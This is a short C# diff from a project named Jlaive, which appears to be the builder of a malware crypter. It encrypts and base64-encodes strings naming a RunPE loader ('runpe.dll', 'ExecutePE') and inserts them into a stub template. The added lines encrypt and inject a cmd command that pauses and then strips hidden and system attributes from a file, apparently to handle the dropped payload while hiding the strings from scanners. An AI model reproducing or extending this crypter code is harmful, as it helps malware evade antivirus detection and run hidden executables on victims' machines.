@@ -44,6 +44,7 @@ namespace Jlaive
             string runpedlltxt_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("runpe.dll"), key, iv));
             string runpeclass_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("runpe.RunPE"), key, iv));
             string runpefunction_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("ExecutePE"), key, iv));
+            string cmdcommand_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("/c choice /c y /n /d y /t 1 & attrib -s -h \""), key, iv));
             string key_str = Convert.ToBase64String(key);
             string iv_str = Convert.ToBase64String(iv);
 
@@ -74,6 +75,7 @@ namespace Jlaive
             stubcode = stubcode.Replace("runpedlltxt_str", runpedlltxt_str);
             stubcode = stubcode.Replace("runpeclass_str", runpeclass_str);
             stubcode = stubcode.Replace("runpefunction_str", runpefunction_str);
+            stubcode = stubcode.Replace("cmdcommand_str", cmdcommand_str);
             stubcode = stubcode.Replace("key_str", key_str);
             stubcode = stubcode.Replace("iv_str", iv_str);
             stub += stubcode;
